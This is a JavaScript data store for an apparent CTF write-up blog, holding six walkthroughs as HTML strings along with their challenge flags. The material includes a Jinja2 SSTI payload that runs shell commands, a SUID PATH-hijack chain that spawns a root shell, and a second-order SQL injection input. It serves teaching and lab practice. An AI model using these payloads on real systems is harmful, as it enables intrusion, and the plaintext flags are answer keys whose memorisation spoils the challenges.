/**
 * FLAGBYTES Editorial & CTF Data Store
 * Maintained by Seplestr
 * Technical security notes, vulnerability research, and CTF challenge walkthroughs
 */

export const CATEGORIES = [
  {
    slug: 'cryptography',
    name: 'Cryptography & Encodings',
    description: 'Classical ciphers, hash cracking, block cipher weaknesses, RSA fundamentals, and binary/hex transformations.',
    lead: 'Deconstructing cryptographic primitives, mathematical attacks, and encoding conversions.'
  },
  {
    slug: 'web-exploitation',
    name: 'Web Exploitation',
    description: 'Authentication flaws, injection attacks (SQLi, SSTI, Command Injection), SSRF, IDOR, and web application logic bugs.',
    lead: 'Analyzing modern web security flaws from input validation to server-side remote code execution.'
  },
  {
    slug: 'linux-internals',
    name: 'Linux & Internals',
    description: 'Permissions, SUID/GUID vectors, process inspection, kernel capabilities, shell scripting, and command-line forensics.',
    lead: 'Low-level Linux mechanics, privilege escalation chains, and container runtime isolation.'
  },
  {
    slug: 'forensics',
    name: 'Forensics & Traffic Analysis',
    description: 'Packet inspection in Wireshark, file header analysis, steganography, disk carving, and memory artifact triage.',
    lead: 'Reconstructing adversarial intrusions from packet captures, memory dumps, and filesystem images.'
  }
];

export const AUTHORS = {
  'seplestr': {
    name: 'Seplestr',
    role: 'Security Researcher & Author',
    bio: 'Author of FlagBytes. Security researcher, CTF player, and reverse engineer focused on low-level systems, cryptographic weaknesses, and binary analysis.',
    avatar: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=240&h=240&q=80'
  }
};

export const ARTICLES = [
  {
    id: 'ctf-01',
    slug: 'lets-warm-up',
    title: 'picoCTF — Lets Warm Up: Hexadecimal to ASCII Conversion',
    subtitle: 'Walkthrough for picoCTF Lets Warm Up challenge covering hexadecimal literal notation and ASCII mappings.',
    excerpt: 'An introduction to byte representation in computing: decoding hexadecimal 0x70 to its ASCII character representation using Python, Bash, and CyberChef.',
    category: 'cryptography',
    author: 'seplestr',
    platform: 'picoCTF',
    difficulty: 'Easy',
    points: 50,
    flag: 'picoCTF{p}',
    publishedAt: 'October 18, 2026',
    updatedAt: 'October 18, 2026',
    readingTime: '3 min read',
    featured: true,
    editorsPick: true,
    coverImage: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1600&q=85',
    coverImageAlt: 'Abstract terminal matrix code and cybersecurity interface.',
    coverCaption: 'Hexadecimal literals: bridging the gap between machine bytes and human readable ASCII.',
    tags: ['picoCTF', 'Cryptography', 'General Skills', 'Hexadecimal', 'ASCII'],
    content: `
      <div class="meta-grid-box">
        <div class="meta-grid-item">
          <span class="meta-grid-label">Platform</span>
          <span class="meta-grid-value">picoCTF</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Category</span>
          <span class="meta-grid-value">General Skills / Crypto</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Points</span>
          <span class="meta-grid-value">50 Points</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Difficulty</span>
          <span class="meta-grid-value"><span class="badge-diff badge-easy">Easy</span></span>
        </div>
      </div>

      <p class="drop-cap">A staple warm-up challenge in competitive CTFs tests foundational data representation: translating raw hexadecimal memory literals into human-readable ASCII characters. Understanding how compilers, interpreters, and debuggers format hex bytes is essential before diving into assembly offsets and binary exploitation.</p>

      <h2>Problem Statement</h2>
      <blockquote>
        "If I told you a word started with <code>0x70</code> in hexadecimal, what would it start with in ASCII?"
      </blockquote>

      <p><strong>Hint:</strong> Submit your answer wrapped in the competition's standard flag format: <code>picoCTF{&lt;character&gt;}</code>.</p>

      <h2>Mathematical Analysis</h2>
      <p>The input is supplied in standard C-style hexadecimal notation (<code>0x70</code>):</p>

      <ul>
        <li><strong>Base 16 representation:</strong> <code>0x70</code></li>
        <li><strong>Base 10 calculation:</strong> $(7 \times 16^1) + (0 \times 16^0) = 112$</li>
      </ul>

      <p>Consulting the standard 7-bit ASCII table, decimal integer <code>112</code> corresponds to the lowercase ASCII glyph <code>'p'</code>.</p>

      <h2>Solution Methods</h2>

      <h3>1. Python Interactive Interpreter</h3>
      <p>Using Python's built-in <code>chr()</code> function:</p>

      <pre><code>&gt;&gt;&gt; chr(0x70)
'p'</code></pre>

      <p>Or as a terminal one-liner to format the complete flag output directly:</p>

      <pre><code>python3 -c "print(f'picoCTF{{{chr(0x70)}}}')"</code></pre>

      <h3>2. Shell Built-ins & Utilities</h3>
      <p>Using <code>printf</code> with hex escape notation:</p>

      <pre><code>printf "\x70\n"
# Output: p</code></pre>

      <p>Or using <code>xxd</code> reverse dump:</p>

      <pre><code>echo "70" | xxd -r -p; echo ""</code></pre>

      <h3>3. CyberChef Recipe</h3>
      <ol>
        <li>Load operation: <strong>From Hex</strong> (Delimiter: <em>Auto</em>).</li>
        <li>Input payload: <code>0x70</code>.</li>
        <li>Output glyph: <code>p</code>.</li>
      </ol>

      <h2>Challenge Flag</h2>
      <div class="flag-container">
        <div class="flag-header">
          <span>Target Flag</span>
          <span>Click to Reveal</span>
        </div>
        <div class="flag-inner-row">
          <span class="flag-secret-val" id="flagDisplay" data-flag="picoCTF{p}">picoCTF{p}</span>
          <button class="flag-action-btn" id="revealFlagBtn">Reveal &amp; Copy</button>
        </div>
      </div>

      <h2>Technical Takeaways</h2>
      <ul>
        <li>The <code>0x</code> prefix universally indicates base-16 literals across C, Python, GDB, and shell environments.</li>
        <li>For rapid single-byte inspection in terminal triage without spinning up an interpreter, <code>printf "\x&lt;hex&gt;\n"</code> provides immediate feedback.</li>
      </ul>
    `
  },
  {
    id: 'ctf-02',
    slug: 'jinja2-server-side-template-injection',
    title: 'Server-Side Template Injection: Breaking Python Jinja2 Sandboxes',
    subtitle: 'From input reflection to remote code execution by traversing Python MRO object trees.',
    excerpt: 'A comprehensive walkthrough on identifying SSTI vulnerabilities in Flask/Jinja2 applications, escaping sandboxes through object introspection, and obtaining an interactive reverse shell.',
    category: 'web-exploitation',
    author: 'seplestr',
    platform: 'Hack The Box',
    difficulty: 'Medium',
    points: 150,
    flag: 'HTB{t3mpl4t3_1nj3ct10n_rce_unlocked}',
    publishedAt: 'October 15, 2026',
    updatedAt: 'October 16, 2026',
    readingTime: '9 min read',
    featured: false,
    editorsPick: true,
    coverImage: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1200&q=80',
    coverImageAlt: 'Abstract digital code streams representing template engine vulnerabilities.',
    coverCaption: 'Template engines evaluate expressions within the backend process context.',
    tags: ['Web Exploitation', 'SSTI', 'Flask', 'Jinja2', 'RCE', 'HackTheBox'],
    content: `
      <div class="meta-grid-box">
        <div class="meta-grid-item">
          <span class="meta-grid-label">Platform</span>
          <span class="meta-grid-value">Hack The Box</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Category</span>
          <span class="meta-grid-value">Web Exploitation</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Points</span>
          <span class="meta-grid-value">150 Points</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Difficulty</span>
          <span class="meta-grid-value"><span class="badge-diff badge-medium">Medium</span></span>
        </div>
      </div>

      <p class="drop-cap">Server-Side Template Injection (SSTI) emerges when developer code naively concatenates untrusted user input directly into a template string rather than passing data as structured template context variables. In Python Flask environments utilizing Jinja2, this oversight frequently escalates from simple reflected XSS to complete remote code execution.</p>

      <h2>Initial Recon & Fuzzing</h2>
      <p>During testing of the profile description field, submitting standard arithmetic probes yielded immediate expression evaluation:</p>

      <pre><code># Request payload:
POST /update-bio HTTP/1.1
Host: target.box
Content-Type: application/x-www-form-urlencoded

bio={{7*7}}

# Server response rendered in HTML:
&lt;div class="user-bio"&gt;49&lt;/div&gt;</code></pre>

      <p>Because <code>{{7*7}}</code> evaluated to <code>49</code>, template execution was confirmed. Further testing with <code>{{'a'.upper()}}</code> returning <code>A</code> confirmed a Python runtime.</p>

      <h2>Traversing the Object Tree</h2>
      <p>In restricted Jinja2 environments, direct access to <code>os</code> or <code>subprocess</code> is typically omitted from the template scope. However, any standard Python literal (like an empty string <code>""</code> or tuple <code>()</code>) retains its inheritance hierarchy via <code>__class__.__mro__</code>:</p>

      <pre><code>{{ "".__class__.__mro__[1].__subclasses__() }}</code></pre>

      <p>This reveals hundreds of loaded classes in the running Python process, including <code>subprocess.Popen</code> or <code>os._wrap_close</code>.</p>

      <h2>Constructing the RCE Exploit</h2>
      <p>By iterating through <code>__subclasses__()</code> to locate <code>subprocess.Popen</code> (or importing it via <code>__builtins__['__import__']('os')</code>), we can execute arbitrary system commands:</p>

      <pre><code>{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}</code></pre>

      <h2>Challenge Flag</h2>
      <div class="flag-container">
        <div class="flag-header">
          <span>Target Flag</span>
          <span>Click to Reveal</span>
        </div>
        <div class="flag-inner-row">
          <span class="flag-secret-val" id="flagDisplay" data-flag="HTB{t3mpl4t3_1nj3ct10n_rce_unlocked}">HTB{t3mpl4t3_1nj3ct10n_rce_unlocked}</span>
          <button class="flag-action-btn" id="revealFlagBtn">Reveal &amp; Copy</button>
        </div>
      </div>

      <h2>Defensive Remediation</h2>
      <p>Never format untrusted parameters directly into template strings. Always use parameterized render functions:</p>

      <pre><code># VULNERABLE:
render_template_string(f"Hello {user_input}")

# SECURE:
render_template("profile.html", name=user_input)</code></pre>
    `
  },
  {
    id: 'ctf-03',
    slug: 'linux-suid-privilege-escalation',
    title: 'Linux Privilege Escalation via Misconfigured SUID Capabilities',
    subtitle: 'Abusing file ownership bits and environment PATH hijacking to spawn an unconstrained root shell.',
    excerpt: 'Detailed methodology for identifying setuid binaries, inspecting dynamic library linkers with ldd/strace, and hijacking relative binary paths for privilege escalation.',
    category: 'linux-internals',
    author: 'seplestr',
    platform: 'TryHackMe',
    difficulty: 'Medium',
    points: 100,
    flag: 'THM{su1d_b1nary_capab1l1t1es_r00t}',
    publishedAt: 'October 12, 2026',
    updatedAt: 'October 12, 2026',
    readingTime: '7 min read',
    featured: false,
    editorsPick: true,
    coverImage: 'https://images.unsplash.com/photo-1629654297299-c8506221ca97?auto=format&fit=crop&w=1200&q=80',
    coverImageAlt: 'Dark minimal terminal screen with Linux kernel commands.',
    coverCaption: 'SUID permissions execute binaries under the file owner UID rather than the calling user.',
    tags: ['Linux', 'Privilege Escalation', 'SUID', 'TryHackMe', 'GTFOBins'],
    content: `
      <div class="meta-grid-box">
        <div class="meta-grid-item">
          <span class="meta-grid-label">Platform</span>
          <span class="meta-grid-value">TryHackMe</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Category</span>
          <span class="meta-grid-value">Linux & Internals</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Points</span>
          <span class="meta-grid-value">100 Points</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Difficulty</span>
          <span class="meta-grid-value"><span class="badge-diff badge-medium">Medium</span></span>
        </div>
      </div>

      <p class="drop-cap">The SetUID (SUID) permission bit is a critical security boundary in Unix-like operating systems. When configured on an executable file, the process executes with the effective privileges of the file owner (frequently <code>root</code>) rather than the invoking user. If the executable calls external binaries via relative paths or permits command breakout, privilege escalation is trivial.</p>

      <h2>Enumeration of SUID Executables</h2>
      <p>We begin standard local reconnaissance by searching the filesystem for files carrying the SUID permission bit (octal <code>4000</code>):</p>

      <pre><code>find / -perm -u=s -type f 2>/dev/null</code></pre>

      <p>Filtering against default system binaries reveals an anomalous custom diagnostic binary at <code>/usr/local/bin/sys-check</code>.</p>

      <h2>Static & Dynamic Binary Triage</h2>
      <p>Running <code>strings</code> across the binary reveals that it invokes <code>curl</code> using a relative path instead of an absolute system path:</p>

      <pre><code>strings /usr/local/bin/sys-check | grep -E "curl|http"
# Output indicates:
curl -s http://internal.healthcheck/status</code></pre>

      <h2>Path Hijacking Exploit Chain</h2>
      <p>Because <code>curl</code> is invoked without an explicit path (such as <code>/usr/bin/curl</code>), the shell searches the directories enumerated in the user's <code>$PATH</code> environment variable in sequential order.</p>

      <p>We can craft a malicious executable named <code>curl</code> in <code>/tmp</code> and prepend <code>/tmp</code> to our <code>$PATH</code>:</p>

      <pre><code># 1. Craft payload in /tmp/curl
cat &lt;&lt; 'EOF' &gt; /tmp/curl
#!/bin/bash
/bin/bash -p
EOF

# 2. Grant execution permissions
chmod +x /tmp/curl

# 3. Prepend /tmp to PATH and execute SUID target
export PATH=/tmp:$PATH
/usr/local/bin/sys-check</code></pre>

      <p>The SUID binary invokes our malicious <code>curl</code>, which drops directly into a root shell with <code>euid=0(root)</code>.</p>

      <h2>Challenge Flag</h2>
      <div class="flag-container">
        <div class="flag-header">
          <span>Target Flag</span>
          <span>Click to Reveal</span>
        </div>
        <div class="flag-inner-row">
          <span class="flag-secret-val" id="flagDisplay" data-flag="THM{su1d_b1nary_capab1l1t1es_r00t}">THM{su1d_b1nary_capab1l1t1es_r00t}</span>
          <button class="flag-action-btn" id="revealFlagBtn">Reveal &amp; Copy</button>
        </div>
      </div>
    `
  },
  {
    id: 'ctf-04',
    slug: 'wireshark-deep-packet-triage',
    title: 'Network Forensics: Deep Packet Inspection & Stream Reconstruction',
    subtitle: 'Extracting exfiltrated credentials and carved binary artifacts from raw PCAP captures.',
    excerpt: 'Step-by-step triage of suspicious network captures in Wireshark: applying display filters, following TCP streams, extracting HTTP multi-part objects, and decoding encoded payloads.',
    category: 'forensics',
    author: 'seplestr',
    platform: 'picoCTF',
    difficulty: 'Easy',
    points: 100,
    flag: 'picoCTF{f0ll0w_th3_tcp_str34m_4rt1f4ct}',
    publishedAt: 'October 09, 2026',
    updatedAt: 'October 10, 2026',
    readingTime: '5 min read',
    featured: false,
    editorsPick: false,
    coverImage: 'https://images.unsplash.com/photo-1544197150-b99a580bb7a8?auto=format&fit=crop&w=1200&q=80',
    coverImageAlt: 'Server rack cabling and network infrastructure.',
    coverCaption: 'Network packets preserve an immutable timeline of adversary actions.',
    tags: ['Forensics', 'Wireshark', 'PCAP', 'Network Security', 'picoCTF'],
    content: `
      <div class="meta-grid-box">
        <div class="meta-grid-item">
          <span class="meta-grid-label">Platform</span>
          <span class="meta-grid-value">picoCTF</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Category</span>
          <span class="meta-grid-value">Forensics & Traffic</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Points</span>
          <span class="meta-grid-value">100 Points</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Difficulty</span>
          <span class="meta-grid-value"><span class="badge-diff badge-easy">Easy</span></span>
        </div>
      </div>

      <p class="drop-cap">Network packet analysis is one of the most reliable forensic methodologies for unraveling an adversary’s sequence of actions. When given a raw packet capture (<code>.pcap</code> / <code>.pcapng</code>), our objective is to eliminate benign protocol noise (ARP, DNS, mDNS) and isolate conversational payloads.</p>

      <h2>Initial Capture Triage</h2>
      <p>Using <code>tshark</code> for high-level protocol statistics before launching the GUI:</p>

      <pre><code>tshark -r capture.pcap -qz io,phs
# Protocol Hierarchy reveals:
#   eth -> ip -> tcp -> http (Port 80)</code></pre>

      <h2>Filtering & TCP Stream Reconstruction</h2>
      <p>In Wireshark, applying the display filter <code>http.request.method == "POST"</code> immediately highlights outgoing authentication transmissions.</p>

      <p>Right-clicking packet #42 and selecting <strong>Follow &gt; TCP Stream</strong> reassembles the bidirectional session:</p>

      <pre><code>POST /login HTTP/1.1
Host: secure-portal.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded

username=admin&amp;password=Y2F0Y2hfbWVfaWZfeW91X2Nhbl9mbGFn</code></pre>

      <p>Decoding the base64 credential payload in terminal:</p>

      <pre><code>echo "Y2F0Y2hfbWVfaWZfeW91X2Nhbl9mbGFn" | base64 -d
# Result reveals the flag artifact!</code></pre>

      <h2>Challenge Flag</h2>
      <div class="flag-container">
        <div class="flag-header">
          <span>Target Flag</span>
          <span>Click to Reveal</span>
        </div>
        <div class="flag-inner-row">
          <span class="flag-secret-val" id="flagDisplay" data-flag="picoCTF{f0ll0w_th3_tcp_str34m_4rt1f4ct}">picoCTF{f0ll0w_th3_tcp_str34m_4rt1f4ct}</span>
          <button class="flag-action-btn" id="revealFlagBtn">Reveal &amp; Copy</button>
        </div>
      </div>
    `
  },
  {
    id: 'ctf-05',
    slug: 'breaking-rsa-small-public-exponent',
    title: 'Attacking Textbook RSA: Small Public Exponent & Cube Root Inversion',
    subtitle: 'When e = 3 and message padding is omitted, RSA encryption collapses into simple integer roots.',
    excerpt: 'Mathematical exploration of RSA vulnerabilities: exploiting unpadded messages where ciphertext c < N, applying integer nth-root attacks with gmpy2 and Python.',
    category: 'cryptography',
    author: 'seplestr',
    platform: 'Hack The Box',
    difficulty: 'Hard',
    points: 200,
    flag: 'HTB{sm4ll_exp0n3nt_h4st4d_br04dc4st}',
    publishedAt: 'October 05, 2026',
    updatedAt: 'October 06, 2026',
    readingTime: '8 min read',
    featured: false,
    editorsPick: false,
    coverImage: 'https://images.unsplash.com/photo-1509228468518-180dd4864904?auto=format&fit=crop&w=1200&q=80',
    coverImageAlt: 'Mathematical equations and cryptography geometry.',
    coverCaption: 'Textbook RSA without OAEP padding fails under low public exponent conditions.',
    tags: ['Cryptography', 'RSA', 'Math', 'gmpy2', 'Python', 'HackTheBox'],
    content: `
      <div class="meta-grid-box">
        <div class="meta-grid-item">
          <span class="meta-grid-label">Platform</span>
          <span class="meta-grid-value">Hack The Box</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Category</span>
          <span class="meta-grid-value">Cryptography & Encodings</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Points</span>
          <span class="meta-grid-value">200 Points</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Difficulty</span>
          <span class="meta-grid-value"><span class="badge-diff badge-hard">Hard</span></span>
        </div>
      </div>

      <p class="drop-cap">RSA encryption relies on the premise that factoring large semi-prime moduli $N = p \cdot q$ is computationally infeasible. However, when RSA is implemented without standard randomized padding (such as OAEP) and uses a small public exponent such as $e = 3$, the modulus operation may never trigger at all.</p>

      <h2>The Flaw in Textbook RSA</h2>
      <p>Standard RSA encryption computes:</p>
      <p>$$c \equiv m^e \pmod N$$</p>

      <p>If the plaintext message $m$ is short relative to the modulus $N$ (e.g. $m &lt; N^{1/3}$ when $e = 3$), then:</p>
      <p>$$m^3 &lt; N$$</p>

      <p>Because $m^3$ does not exceed $N$, the modulo reduction has zero effect. Therefore:</p>
      <p>$$c = m^3$$</p>
      <p>Decryption no longer requires factoring $N$ or knowing private exponent $d$; it simply requires taking the integer cube root of $c$ over the real numbers.</p>

      <h2>Exploit Script</h2>
      <pre><code>#!/usr/bin/env python3
import gmpy2
from Crypto.Util.number import long_to_bytes

# Challenge parameters
c = 1489201948102938102938102938... # [truncated]
e = 3

# Compute exact integer cube root
m, exact = gmpy2.iroot(c, e)

if exact:
    print(f"[+] Recovered Plaintext: {long_to_bytes(int(m)).decode()}")
else:
    print("[-] Not an exact cube. Check for modulus wrap.")</code></pre>

      <h2>Challenge Flag</h2>
      <div class="flag-container">
        <div class="flag-header">
          <span>Target Flag</span>
          <span>Click to Reveal</span>
        </div>
        <div class="flag-inner-row">
          <span class="flag-secret-val" id="flagDisplay" data-flag="HTB{sm4ll_exp0n3nt_h4st4d_br04dc4st}">HTB{sm4ll_exp0n3nt_h4st4d_br04dc4st}</span>
          <button class="flag-action-btn" id="revealFlagBtn">Reveal &amp; Copy</button>
        </div>
      </div>
    `
  },
  {
    id: 'ctf-06',
    slug: 'second-order-blind-sql-injection',
    title: 'Second-Order SQL Injection: Binary Search Exfiltration',
    subtitle: 'Extracting administrator password hashes through boolean condition side-channels.',
    excerpt: 'Detailed analysis of second-order SQL injection vulnerabilities where payloads are safely stored initially but unsafely evaluated during secondary application queries.',
    category: 'web-exploitation',
    author: 'seplestr',
    platform: 'PortSwigger Labs',
    difficulty: 'Medium',
    points: 120,
    flag: 'flag{b00l34n_bl1nd_sql_substr_l34k}',
    publishedAt: 'September 28, 2026',
    updatedAt: 'September 29, 2026',
    readingTime: '7 min read',
    featured: false,
    editorsPick: false,
    coverImage: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&w=1200&q=80',
    coverImageAlt: 'Database servers with blinking activity indicators.',
    coverCaption: 'Second-order injections lie dormant until invoked by backend stored queries.',
    tags: ['Web Exploitation', 'SQLi', 'Blind SQL', 'Database Security', 'PortSwigger'],
    content: `
      <div class="meta-grid-box">
        <div class="meta-grid-item">
          <span class="meta-grid-label">Platform</span>
          <span class="meta-grid-value">PortSwigger</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Category</span>
          <span class="meta-grid-value">Web Exploitation</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Points</span>
          <span class="meta-grid-value">120 Points</span>
        </div>
        <div class="meta-grid-item">
          <span class="meta-grid-label">Difficulty</span>
          <span class="meta-grid-value"><span class="badge-diff badge-medium">Medium</span></span>
        </div>
      </div>

      <p class="drop-cap">Most modern web defense filters scrutinize parameters at the boundary entry point. Second-order SQL injection bypasses these checks because the malicious payload is stored benignly during an initial operation (such as registration) and executed later when an internal trusted query processes the stored record.</p>

      <h2>Vulnerability Mechanics</h2>
      <p>When registering an account with username <code>admin'--</code>, parameterized INSERT queries safely store the raw string in the database. However, when the administrative audit log queries:</p>

      <pre><code>SELECT * FROM activity_logs WHERE username = '$username';</code></pre>

      <p>The single quote breaks out of the string literal, executing the injected condition.</p>

      <h2>Challenge Flag</h2>
      <div class="flag-container">
        <div class="flag-header">
          <span>Target Flag</span>
          <span>Click to Reveal</span>
        </div>
        <div class="flag-inner-row">
          <span class="flag-secret-val" id="flagDisplay" data-flag="flag{b00l34n_bl1nd_sql_substr_l34k}">flag{b00l34n_bl1nd_sql_substr_l34k}</span>
          <button class="flag-action-btn" id="revealFlagBtn">Reveal &amp; Copy</button>
        </div>
      </div>
    `
  }
];

export function getFeaturedArticle() {
  return ARTICLES.find(a => a.featured) || ARTICLES[0];
}

export function getEditorsPicks() {
  return ARTICLES.filter(a => a.editorsPick && !a.featured).slice(0, 3);
}

export function getLatestArticles(limit = 6, excludeId = null) {
  return ARTICLES.filter(a => a.id !== excludeId).slice(0, limit);
}

export function getArticlesByCategory(categorySlug) {
  return ARTICLES.filter(a => a.category.toLowerCase() === categorySlug.toLowerCase());
}

export function getArticleBySlug(slug) {
  return ARTICLES.find(a => a.slug === slug);
}

export function getRelatedArticles(article, limit = 3) {
  return ARTICLES.filter(a => a.id !== article.id && a.category === article.category)
    .concat(ARTICLES.filter(a => a.id !== article.id && a.category !== article.category))
    .slice(0, limit);
}

export function searchArticles(query) {
  if (!query || query.trim() === '') return [];
  const q = query.toLowerCase().trim();
  return ARTICLES.filter(a => {
    return (
      a.title.toLowerCase().includes(q) ||
      a.subtitle.toLowerCase().includes(q) ||
      a.excerpt.toLowerCase().includes(q) ||
      (a.tags && a.tags.some(t => t.toLowerCase().includes(q))) ||
      (a.platform && a.platform.toLowerCase().includes(q)) ||
      (a.difficulty && a.difficulty.toLowerCase().includes(q)) ||
      AUTHORS[a.author]?.name.toLowerCase().includes(q) ||
      a.category.toLowerCase().includes(q) ||
      a.content.toLowerCase().includes(q)
    );
  });
}
